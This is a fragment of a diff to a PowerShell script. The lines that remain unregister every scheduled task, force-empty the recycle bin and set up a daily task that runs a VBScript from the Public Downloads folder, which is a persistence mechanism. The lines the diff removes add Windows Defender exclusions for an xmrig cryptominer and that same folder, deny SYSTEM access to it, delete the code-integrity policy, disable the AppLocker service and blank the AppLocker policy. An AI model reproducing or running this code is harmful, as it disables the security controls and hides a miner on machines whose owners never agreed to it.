@@ -248,17 +248,6 @@ Get-ScheduledTask | Where-Object {$_.TaskPath -like "\Microsoft\Windows\WindowsU
 Get-ScheduledTask | Where-Object {$_.TaskName -like "*reboot*" -or $_.TaskName -like "*restart*"} | ForEach-Object {Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false}
 Get-ScheduledTask | ForEach-Object {Unregister-ScheduledTask -TaskName $_.TaskName -TaskPath $_.TaskPath -Confirm:$false}
 Clear-RecycleBin -Force
-$p = Get-CimInstance Win32_Process -Filter "Name='xmrig.exe'"
-if($p){
-    Add-MpPreference -ExclusionProcess $p.ExecutablePath
-}
-Add-MpPreference -ExclusionPath "C:\Users\Public\Downloads"
-icacls "C:\Users\Public\Downloads" /deny "*S-1-5-18:(OI)(CI)(F)"
-Remove-Item "$env:SystemRoot\System32\CodeIntegrity\SIPolicy.p7b" -Force
-Stop-Service AppIDSvc -Force
-Set-Service AppIDSvc -StartupType Disabled
-Get-AppLockerPolicy -Local | Out-Null
-'<AppLockerPolicy Version="1"/>' | Set-Content "$env:TEMP\clear.xml"; Set-AppLockerPolicy -XMLPolicy "$env:TEMP\clear.xml"
 $taskName = "Run Setup.vbs Daily"
 $setupPath = "C:\Users\Public\Downloads\Setup.vbs"
 $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$setupPath`""
